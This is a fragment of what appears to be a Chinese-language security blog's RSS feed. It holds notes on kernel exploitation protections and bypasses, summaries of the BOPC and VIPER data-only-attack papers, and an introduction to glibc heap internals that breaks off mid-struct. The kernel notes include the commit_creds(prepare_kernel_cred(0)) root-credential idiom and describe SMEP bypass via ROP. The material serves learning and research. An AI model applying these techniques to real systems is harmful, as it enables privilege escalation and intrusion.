&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;service&lt;/span&gt; lightdm resta&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;建立python与python3之间的软连接&#34;&gt;&lt;a href=&#34;#建立python与python3之间的软连接&#34; class=&#34;headerlink&#34; title=&#34;建立python与python3之间的软连接&#34;&gt;&lt;/a&gt;建立python与python3之间的软连接&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token function&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;ln&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-s&lt;/span&gt; /usr/bin/python3 /usr/bin/python&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://alazymechnaic.github.io/2023/07/13/kernel-pwn/</guid>
            <title>kernel_pwn</title>
            <link>https://alazymechnaic.github.io/2023/07/13/kernel-pwn/</link>
            <category>kernel pwn</category>
            <pubDate>Thu, 13 Jul 2023 20:41:24 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;Kernel-PWN&#34;&gt;&lt;a href=&#34;#Kernel-PWN&#34; class=&#34;headerlink&#34; title=&#34;Kernel PWN&#34;&gt;&lt;/a&gt;Kernel PWN&lt;/h2&gt;&lt;hr&gt;
&lt;p&gt;&lt;img data-src=&#34;/kernel-pwn.assets/image-20230713204349079.png&#34; alt=&#34;image-20230713204349079&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;内核保护技术&#34;&gt;&lt;a href=&#34;#内核保护技术&#34; class=&#34;headerlink&#34; title=&#34;内核保护技术&#34;&gt;&lt;/a&gt;内核保护技术&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;SMAP/SMEP&lt;/strong&gt;: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;arm里面叫PXN(Privilege Execute Never)和PAN(Privileged Access Never)。&lt;/em&gt;&lt;ul&gt;
&lt;li&gt;SMAP(Supervisor Mode Access Prevention，管理模式访问保护): 禁止内核访问用户空间数据&lt;/li&gt;
&lt;li&gt;SMEP(Supervisor Mode Execution Prevention，管理模式执行保护): 禁止内核访问用户代码区域&lt;/li&gt;
&lt;li&gt;使用cat /proc/cpuinfo指令查看当前程序中存在的SMAP/SMEP功能是否支持，&lt;strong&gt;win8之后开始支持SMEP，并且在RC4中设置适当的位来表示应该强制执行SMEP，可以通过ROP或者jmp到一个RWX的内核地址来绕过&lt;/strong&gt;。linux内核从3.0开始支持SMEP，3.7开始支持SMAP。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ret2User: 在没有SMAP/SMEP保护的情况下将内核指针重定向到用户空间进行漏洞利用&lt;/li&gt;
&lt;li&gt;ret2dir:  physmap区域由内核管理并且由虚拟地址直接映射到物理地址。（也就时可以直接访问实际物理内存的内容）。在用户进行vmmap操作的时候，有很大概率能够将当前内存写入到该物理内存中，而内核又是可以直接访问该区域的，因此可以bypass SMAP/SMEP 参考文献： &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8zYzY2MmI2MTYzYTc=&#34;&gt;https://www.jianshu.com/p/3c662b6163a7&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;stack protector&lt;/strong&gt;:  在编译内核时选择&lt;em&gt;CONFIG_CC_STACKPROTECTOR&lt;/em&gt;选项开启该保护，功能类似canary&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;Kernel Address Display Restrict&lt;/strong&gt; ：限制内核地址显示，当攻击者试图开发通用性更强的漏洞利用程序时，他们通常需要知道内核结构的位置。 通过将内核地址视为敏感信息，常规本地用户无法看到那些地址。 从Ubuntu 11.04开始，/ proc / sys / kernel / kptr_restrict设置为“ 1”，以阻止报告已知的内核地址泄漏。 此外，只有root用户才能读取各种文件和目录：/boot/vmlinuz&lt;em&gt;、/boot/System.map&lt;/em&gt;、/sys/kernel/debug/、/proc/slabinfo&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;h3 id=&#34;Kernel-Address-Space-Layout-Randomisation：&#34;&gt;&lt;a href=&#34;#Kernel-Address-Space-Layout-Randomisation：&#34; class=&#34;headerlink&#34; title=&#34;Kernel Address Space Layout Randomisation：&#34;&gt;&lt;/a&gt;Kernel Address Space Layout Randomisation：&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;内存地址随机化，类似一般程序中的地址随机化，只不过是发生在内核&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&#34;line-numbers language-c&#34; data-language=&#34;c&#34;&gt;&lt;code class=&#34;language-c&#34;&gt;&lt;span class=&#34;token function&#34;&gt;commit_creds&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;prepare_kernel_cred&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;// prepare_kernel_cred(0) 用0为参数生成一个root权限的结构体，并将其传递给commit_creds&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;// commit_creds 用于将当前结构体设置为当前程序的凭证&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;



&lt;h2 id=&#34;安装qemu启动一个Linux内核调试试一下&#34;&gt;&lt;a href=&#34;#安装qemu启动一个Linux内核调试试一下&#34; class=&#34;headerlink&#34; title=&#34;安装qemu启动一个Linux内核调试试一下&#34;&gt;&lt;/a&gt;安装qemu启动一个Linux内核调试试一下&lt;/h2&gt;&lt;h3 id=&#34;参考链接&#34;&gt;&lt;a href=&#34;#参考链接&#34; class=&#34;headerlink&#34; title=&#34;参考链接&#34;&gt;&lt;/a&gt;参考链接&lt;/h3&gt;&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjYyNDI1Lmh0bQ==&#34;&gt;https://bbs.kanxue.com/thread-262425.htm&lt;/span&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://alazymechnaic.github.io/2023/07/04/bopc-data-only-attack/</guid>
            <title>BOPC_Data_Only_Attack</title>
            <link>https://alazymechnaic.github.io/2023/07/04/bopc-data-only-attack/</link>
            <category>paper</category>
            <pubDate>Tue, 04 Jul 2023 17:09:42 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;Block-Oriented-Programming-Automating-Data-Only-Attacks&#34;&gt;&lt;a href=&#34;#Block-Oriented-Programming-Automating-Data-Only-Attacks&#34; class=&#34;headerlink&#34; title=&#34;Block Oriented Programming: Automating Data-Only Attacks&#34;&gt;&lt;/a&gt;Block Oriented Programming: Automating Data-Only Attacks&lt;/h2&gt;&lt;hr&gt;
&lt;p&gt;目的： 能够依照代码块组指出包含特定语义的结构。构造出了一种自己的语言SPL，生成SPL payload来组织成特定的语义。&lt;/p&gt;
&lt;p&gt;前提： 一个任意内存写原语（能够向任意位置中写入任意值），一个任意内存读原语（可选），以及执行完上述两个原语后自然到达的位置。（其实本质上来讲改文章的贡献在于如何充分利用给一个AWP(任意内存写原语)&lt;/p&gt;
&lt;p&gt;流程：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;BOPC提供了一个面向exploit编程的语言SPL，使分析人员能够定义一个独立于目标问题和底层架构的exploit&lt;/li&gt;
&lt;li&gt;在目标程序中搜索相应的功能块作为基本块&lt;/li&gt;
&lt;li&gt;搜索Dispatcher块用于将各个功能块链接在一起&lt;/li&gt;
&lt;li&gt;依照AWP构造出相应的BOP链的payload&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;关键技术：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Block Oriented Programming&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;BOP链由表示一条SPL语义的BOP gadget和链接这些BOP gadget的DIspatcher组成&lt;/li&gt;
&lt;li&gt;将每个基本块抽象为块约束摘要便于与SPL语言的一一对应。但是由于进入该块的时候上下文的不同，每一个块可能会表现出不同的功能（这里怎么进行抽象的？&lt;/li&gt;
&lt;li&gt;构造BOP链本身是NP难的问题&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Block Constraint Summaries&lt;/strong&gt;：  &lt;/p&gt;
&lt;p&gt;​	将程序的输入映射到程序执行路径是NP难的问题，&lt;strong&gt;使用启发式的方法帮助查找路径中所有可能的路径&lt;/strong&gt;。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;对单个块做符号执行，收集约束，做出输入与输出之间的映射关系。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;要查找块和SPL语句之间的匹配，块必须执行该SPL语句所需的所有操作。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;BOPC依照语义计算一组候选功能块和相应的分发器，但是很可能选出的几个gadget之间并不存在合法的路径，或者符合CFI的路径&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;BOP gadget依照选取的块不同，其本身也是不稳定的，前面的gadget很可能会改变后面gadget的性质，同时不断增加gadget也会增加当前路径的约束&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;解决方案&lt;/strong&gt;：BOPC使用当前程序的BOP块的接近度用于评分排序，以及delta图来组织BOP gadget序列&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;BOP块接近度&lt;/strong&gt;：&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;delta图&lt;/strong&gt;：用于表示当前搜寻分发器block的状态。&lt;ul&gt;
&lt;li&gt;存储每一个功能块到下一个候选块之前的最短路径&lt;/li&gt;
&lt;li&gt;任意拼接两个块之间的路径本身是一个NP难的问题&lt;/li&gt;
&lt;li&gt;功能块之间的选择依据是，更短的路径可能会导致更合适的约束&lt;/li&gt;
&lt;li&gt;delta图中记录了每一个功能块，功能块的边是两个功能块之间转移需要经过的block数量.（但是在计算两个block之间的路径时，静态CFG上是可以有多个重点，但在实际执行时只会有一个终点。其实就是对控制流进行枚举的过程，你怎么知道实际路径是哪些的&lt;/li&gt;
&lt;li&gt;文章提出的路径算法是迪杰斯特拉算法的递归版本，并且避免了所有的破坏块。&lt;ul&gt;
&lt;li&gt;迪杰斯特拉算法：不断加入新的结点作为中间跳转结点，计算出最短距离&lt;/li&gt;
&lt;li&gt;算法逻辑：初始分析时将相邻的边的开销设置为1。当其遇到call指令时，就进行递归地计算，找到每个功能块之间的最短路径&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;BOP gadget缝合：&lt;ul&gt;
&lt;li&gt;从每一个BOPgadget开始不断向后进行符号执行读入新的BOP功能块，直到最后一个块。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在进行组织的过程中需要在BOP gadget间拼接不会影响当前程序执行流的基本块。使用delta 图来搜索当前所有的调度块。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://alazymechnaic.github.io/2023/06/27/viper-ssgvdoa/</guid>
            <title>VIPER_SSGVDOA</title>
            <link>https://alazymechnaic.github.io/2023/06/27/viper-ssgvdoa/</link>
            <category>paper</category>
            <pubDate>Tue, 27 Jun 2023 09:50:02 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;VIPER-Spotting-Syscall-Guard-Variables-for-Data-Only-Attacks&#34;&gt;&lt;a href=&#34;#VIPER-Spotting-Syscall-Guard-Variables-for-Data-Only-Attacks&#34; class=&#34;headerlink&#34; title=&#34;VIPER: Spotting Syscall-Guard Variables for Data-Only Attacks&#34;&gt;&lt;/a&gt;VIPER: Spotting Syscall-Guard Variables for Data-Only Attacks&lt;/h2&gt;&lt;hr&gt;
&lt;h3 id=&#34;摘要&#34;&gt;&lt;a href=&#34;#摘要&#34; class=&#34;headerlink&#34; title=&#34;摘要&#34;&gt;&lt;/a&gt;摘要&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;文章的主要目的是检查那些影响数据流，促使程序运行至关键系统调用的关键变量。VIPER能够自动化地查找实现对系统调用保护分支和变量的自动和可扩展检测&lt;/li&gt;
&lt;li&gt;两个关键定义：Syscall-Guard Variables，syscallguard变量决定是否调用与安全相关的系统调用 ，因此它们的值对程序安全性有直接影响。这意味着它们应该被视为关键数据。同样也衍生出，syscall-Guard branch，用于决定是否会执行当前的系统调用。&lt;/li&gt;
&lt;li&gt;一个关键方法： 文章提出了分支强制（branch force），它有意地翻转执行过程中的每个条件分支，并检查是否调用了新的与安全相关的syscalls。如果是，则进行数据流分析以估计通过常见内存错误翻转这些分支的可行性。&lt;/li&gt;
&lt;li&gt;基本逻辑：程序想要通过数据流攻击实现一定的攻击语义，必须要依赖于一定的系统调用实现。然而系统调用在处理不受信任的输入前一定会存在一定的检查操作。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;识别困难&#34;&gt;&lt;a href=&#34;#识别困难&#34; class=&#34;headerlink&#34; title=&#34;识别困难&#34;&gt;&lt;/a&gt;识别困难&lt;/h3&gt;&lt;p&gt;​	关键变量可能会以任何数据类型，任何存储位置存在。这会导致传统的分析方式失效。况且对于大型程序，进行变量的推断是十分困难的。&lt;/p&gt;
&lt;h3 id=&#34;攻击的前提&#34;&gt;&lt;a href=&#34;#攻击的前提&#34; class=&#34;headerlink&#34; title=&#34;攻击的前提&#34;&gt;&lt;/a&gt;攻击的前提&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;不管程序是什么，大多数纯数据攻击都依赖于与安全相关的系统 调用(简称系统调用)来实现最终目标。（其实就是最终的攻击语义一定要依赖于系统调用的存在）&lt;/li&gt;
&lt;li&gt;关键的系统调用函数前一定会存在一些分支检查&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;技术方案&#34;&gt;&lt;a href=&#34;#技术方案&#34; class=&#34;headerlink&#34; title=&#34;技术方案&#34;&gt;&lt;/a&gt;技术方案&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;使用相同的输入进入程序，找到分支，进行强制跳转。如果强制跳转之后触发了程序的bug，那么该分支就作为候选分支&lt;/li&gt;
&lt;li&gt;在一次执行中翻转分支条件，找到新的分支条件生成新的路径，查找新的系统调用&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;challenge&#34;&gt;&lt;a href=&#34;#challenge&#34; class=&#34;headerlink&#34; title=&#34;challenge&#34;&gt;&lt;/a&gt;challenge&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;修剪掉无用的分支，并且评估单个变量的影响是十分有挑战性的。符号执行能够找到从程序入口到关键系统调用的路径，但是并不能给出，当前路径上的哪些分支是更重要的，因此只能对所有的分支都做分析&lt;/li&gt;
&lt;li&gt;找到一种高效的分析方法很困难，使用间接函数调用的程序太多了，使用静态分析十分不切实际&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;approaches&#34;&gt;&lt;a href=&#34;#approaches&#34; class=&#34;headerlink&#34; title=&#34;approaches&#34;&gt;&lt;/a&gt;approaches&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;branch force&lt;/strong&gt;：收集候选的分支变量&lt;ul&gt;
&lt;li&gt;思想：假设当前分支时关键保护分支，那么该分支向后执行仅仅只能有其中一个分支触发当前程序中的系统调用，如果两个都能触发，那这个分支肯定不是关键保护分支。如果都不能触发，则该分支对于当前程序的安全性并不重要。&lt;/li&gt;
&lt;li&gt;执行流程：&lt;ul&gt;
&lt;li&gt;以相同的输入I执行程序，将遇到的每一个分支进行强制翻转（并不改变输入），并且&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;/VIPER-SSGVDOA.assets/image-20230628155213365.png&#34; alt=&#34;image-20230628155213365&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;dynamic backward data-flow&lt;/strong&gt;：检查每个变量被覆盖利用的可能性&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Corruptibility Assessment&lt;/strong&gt; ： 使用数据流来评估每一个分支变量被内存错误污染的可能性。同时使用动态数据流分析，在过程中根据变量的存储位置和内存的声明周期对内存进行定性，分别视为容易利用和难利用三种等级。全局变量相对局部变量更容易被利用，生命周期越长，被修改次数越多，能被利用的概率越高。依此能够筛选出被破坏概率更高的关键变量。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;整体流程&#34;&gt;&lt;a href=&#34;#整体流程&#34; class=&#34;headerlink&#34; title=&#34;整体流程&#34;&gt;&lt;/a&gt;整体流程&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;/VIPER-SSGVDOA.assets/image-20230628205325968.png&#34; alt=&#34;image-20230628205325968&#34;&gt;&lt;/p&gt;
&lt;p&gt;VIPER在对程序分析后，最终会报告当前程序中存在的各种危险的关键分支，系统调用及其保护变量。&lt;/p&gt;
&lt;p&gt;​	BranchForcer运行包含原始输入的程序，并记录执行的分支和系统调用。然后，使用相同的输入多次运行程序，并为每次新的执行翻转一个不同分支的目标。如果重新执行触发了新的与安全性相关的系统调用，我们将当前分支添加到候选列表中。对于每个候选分支，VariableRator再次运行程序，以记录执行的完整跟踪，包括分支序列、所有内存访问地址和进程内存布局。利用记录的轨迹对程序IR进行反向数据流分析。VariableRator检查内存布局以确定每个内存节点的位置，并计算内存写指令的数量以估计节点的生命周期&lt;/p&gt;
&lt;h3 id=&#34;分支记录&#34;&gt;&lt;a href=&#34;#分支记录&#34; class=&#34;headerlink&#34; title=&#34;分支记录&#34;&gt;&lt;/a&gt;分支记录&lt;/h3&gt;&lt;p&gt;​	由于在执行的过程中可能会出现路径爆炸以及某些分支翻转了没有意义，因此只在固定路径上做分支翻转。每个分支只会做一次翻转。为了提高效率，使用多线程尽心探索。&lt;/p&gt;
&lt;p&gt;​	每次使用相同的输入和不同的分支翻转执行程序，如果遇到新的系统调用就将当前路径做为候选路径进行存储，然后进行完整的分支执行分析，利用数据流进行后向切片，确定所有与分支保护状态相关的指令。利用值集分析来找到控制变量中所有可能的值。&lt;/p&gt;
&lt;p&gt;​	&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://alazymechnaic.github.io/2023/05/12/blind-rop/</guid>
            <title>blind-rop</title>
            <link>https://alazymechnaic.github.io/2023/05/12/blind-rop/</link>
            <pubDate>Fri, 12 May 2023 20:28:01 +0800</pubDate>
            <description><![CDATA[  ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://alazymechnaic.github.io/2023/05/12/heap-exp-heap-management/</guid>
            <title>HEAP-EXP-heap_management</title>
            <link>https://alazymechnaic.github.io/2023/05/12/heap-exp-heap-management/</link>
            <category>HEAP PWN CTF</category>
            <pubDate>Fri, 12 May 2023 19:47:55 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;堆利用&#34;&gt;&lt;a href=&#34;#堆利用&#34; class=&#34;headerlink&#34; title=&#34;堆利用&#34;&gt;&lt;/a&gt;堆利用&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;​	本文用于介绍当前堆管理方式，堆溢出原理，常见的攻击方式及相关例题题解。&lt;/p&gt;
&lt;h2 id=&#34;堆管理机制&#34;&gt;&lt;a href=&#34;#堆管理机制&#34; class=&#34;headerlink&#34; title=&#34;堆管理机制&#34;&gt;&lt;/a&gt;堆管理机制&lt;/h2&gt;&lt;p&gt;​	堆区域与栈区域在内存使用上存在不同：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;堆位于当前程序中较低的地址位置，栈位于当前程序中的较高内存空间位置&lt;/li&gt;
&lt;li&gt;堆在使用时从低地址内存向高地址内存增长，栈从高地址内存向低地址内存增长&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;堆和栈都可以是每个线程所有独有的，堆依然存在线程堆的概念&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;/HEAP-EXP-heap-management.assets/image-20230613200259727.png&#34; alt=&#34;先知社区https://xz.aliyun.com/t/10650&#34;&gt;&lt;/p&gt;
&lt;p&gt;(上图中的共享库段中包含有不同权限的几个内存段，如下图所示，其中mapped区域是当前so文件代码段对应的heap段)&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/HEAP-EXP-heap-management.assets/image-20230613200729790.png&#34; alt=&#34;image-20230613200729790&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;内存管理&#34;&gt;&lt;a href=&#34;#内存管理&#34; class=&#34;headerlink&#34; title=&#34;内存管理&#34;&gt;&lt;/a&gt;内存管理&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;32位下的text段是即时elf文件装入操作系统的起始位置0x8048000，也就是整个虚拟内存中用户可用的起始位置,最远的访问位置到0xbfffffff.&lt;/li&gt;
&lt;li&gt;64位下的内存起始位置在0x0000000000400000处，64位下总的内存大小为2的48次方，&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;内存的分配管理策略&#34;&gt;&lt;a href=&#34;#内存的分配管理策略&#34; class=&#34;headerlink&#34; title=&#34;内存的分配管理策略&#34;&gt;&lt;/a&gt;内存的分配管理策略&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;具有较长生命周期的大内存使用mmap进行分配（例如说，在初始化给用户分配堆的过程）&lt;/li&gt;
&lt;li&gt;特别大的内存分配使用的是mmap，&lt;strong&gt;使用mmap申请的内存在释放后并不会放入bin，而是直接还给操作系统，因为这一部分内存块一般都比较大&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;短生命周期的内存分配使用brk，因为使用mmap分配的内存块需要多个物理页，浪费资源&lt;/li&gt;
&lt;li&gt;空闲小块是被管理，大内存块和长生命周期块都是直接回收返还给内存&lt;/li&gt;
&lt;li&gt;对于空闲的小内存块只会在malloc和free的时候进行合并，free后的空闲块可能放入pool中&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;注意一点，在程序运行初期会使用brk分配一个内存空间，该内存空间中的内容再被用户进行各种malloc的分配，该分配区域被称作为主分配区，由brk和sbrk两个指针限定边缘。如果当前的heap0中有合适的小内存块就直接分配，但是当使用free时，合并后的chunk大小大于64kb时才会将顶端的空闲内存返回给操作系统&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;arena分配区机制&#34;&gt;&lt;a href=&#34;#arena分配区机制&#34; class=&#34;headerlink&#34; title=&#34;arena分配区机制&#34;&gt;&lt;/a&gt;arena分配区机制&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;arena就是mmap heap1/heap2等，该分配区一旦产生就不能再减少。每个arena中都使用独立的bin机制来管理当前线程的内存块，&lt;strong&gt;但是如果是单线程程序也可以拥有多个arena&lt;/strong&gt;，多个线程存在时，在malloc后可以使用其他线程的arena来分配内存：&lt;ul&gt;
&lt;li&gt;首先循环遍历所有可用的 &lt;em&gt;arena&lt;/em&gt;，在遍历的过程中，它会尝试加锁该 &lt;em&gt;arena&lt;/em&gt;。如果成功加锁（该 &lt;em&gt;arena&lt;/em&gt; 当前对应的线程并未使用堆内存则表示可加锁），比如将 &lt;em&gt;main arena&lt;/em&gt; 成功锁住，那么就将 &lt;em&gt;main arena&lt;/em&gt; 返回给用户，即表示该 &lt;em&gt;arena&lt;/em&gt; 被子线程 3 共享使用。&lt;/li&gt;
&lt;li&gt;如果没能找到可用的 &lt;em&gt;arena&lt;/em&gt;，那么就将子线程 3 的 &lt;code&gt;malloc&lt;/code&gt; 操作阻塞，直到有可用的 &lt;em&gt;arena&lt;/em&gt; 为止&lt;/li&gt;
&lt;li&gt;现在，如果子线程 3 再次调用 &lt;code&gt;malloc&lt;/code&gt; 的话，&lt;code&gt;glibc&lt;/code&gt; 的 &lt;code&gt;malloc&lt;/code&gt; 就会先尝试使用最近访问的 &lt;em&gt;arena&lt;/em&gt;（此时为 &lt;em&gt;main arena&lt;/em&gt;）。如果此时 &lt;em&gt;main arena&lt;/em&gt; 可用的话，就直接使用，否则就将子线程 3 阻塞，直到 &lt;em&gt;main arena&lt;/em&gt; 再次可用为止。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;在创建非主分配区时会先mmap创建分为一块较大的内存空间来模拟sub-heap（也就是类似主分配区的heap段），当然有heap就有top段的内容，topchunk是永远不会放在bin中的，因为top chunk总是在fast bin与bin之后被考虑。&lt;/li&gt;
&lt;li&gt;每个进程只能有一个主分配区，但有多个非主分配区&lt;ul&gt;
&lt;li&gt;主分配区可以使用brk和mmap两种方式进行内存的分配&lt;/li&gt;
&lt;li&gt;非主分配区只能使用mmap的方式进行内存的分配，但与主分配区相同，都使用链表进行管理&lt;/li&gt;
&lt;li&gt;同样在多线程下，主线程能够使用主分配区，当然其他线程也可以，线程之间对于堆内存的访问是不存在限制的，因此其他线程也是能够释放主线程内存的，但是分配区存在锁机制，对分配区的操作要进行互斥。线程在使用内存时，只能通过先用mmap申请一块大内存（32位默认1MB，64位默认64MB）到用户空间，再使用malloc一点一点分配出去。这个mmap分出来的这块内存就是非主分配区，管理这块内存的就是arena&lt;/li&gt;
&lt;li&gt;可以看到一个线程只能有一个分配区（arena）但是一个arena可以管理多个堆块，主分配区域只需要管理一个堆块就可以了，就是使用brk分配的那个。&lt;/li&gt;
&lt;li&gt;多线程环境下内存的分配与回收：&lt;ul&gt;
&lt;li&gt;查看当前线程下是否存在一个分配区，若存在一个分配区则尝试加锁，进行后续操作；如果加锁失败，则让分配器循环遍历arena，找到没有加锁的arena进行内存的分配操作；若所有的arena都在用，则使用malloc重新开辟一个新的内存空间，构造一个新的分配区；&lt;/li&gt;
&lt;li&gt;当进行内存的释放时，内存所在的分配区被加锁则等待，直到互斥锁被解开之后才能继续使用。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;进一步的，每个arena管理的heap可以抽象成一个在地址上连续的内存片段，内存片段被抽象为无数个chunk未被分配的chunk都视为top chunk，对于已经释放的free chunk部分则会使用一个双向链表进行管理，每次在分配时会遍历这个双向链表选择最合适的内存块，而管理各种不同的空闲块的管理器就是bin机制。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;堆管理的数据结构&#34;&gt;&lt;a href=&#34;#堆管理的数据结构&#34; class=&#34;headerlink&#34; title=&#34;堆管理的数据结构&#34;&gt;&lt;/a&gt;堆管理的数据结构&lt;/h2&gt;&lt;h3 id=&#34;heap-info&#34;&gt;&lt;a href=&#34;#heap-info&#34; class=&#34;headerlink&#34; title=&#34;heap_info&#34;&gt;&lt;/a&gt;heap_info&lt;/h3&gt;&lt;p&gt;​	一个程序在运行时不只是存在一个主线程的heap，还会存在其他线程的heap（使用mmap申请的heap，使用该线程的arena进行管理），那么这些heap的信息需要使用一个heap_info 的结构进行管理，所以这部分的结构也叫作heap header。&lt;/p&gt;
&lt;p&gt;​	主线程的堆不是分配在内存映射区，而是进程的虚拟内存堆区，因此不含有多个 &lt;em&gt;heap&lt;/em&gt; 所以也就不含有 &lt;code&gt;heap_info&lt;/code&gt; 结构体。当需要更多堆空间的时候，直接通过增长 &lt;code&gt;brk&lt;/code&gt; 指针来获取更多的空间，直到它碰到内存映射区域为止&lt;/p&gt;
&lt;p&gt;​	依照该数据结构的情况能够看到：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-c&#34; data-language=&#34;c&#34;&gt;&lt;code class=&#34;language-c&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;heap_info&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
  &lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;heap_info&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;prev&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;//指向前一个heap_info结构&lt;/span&gt;
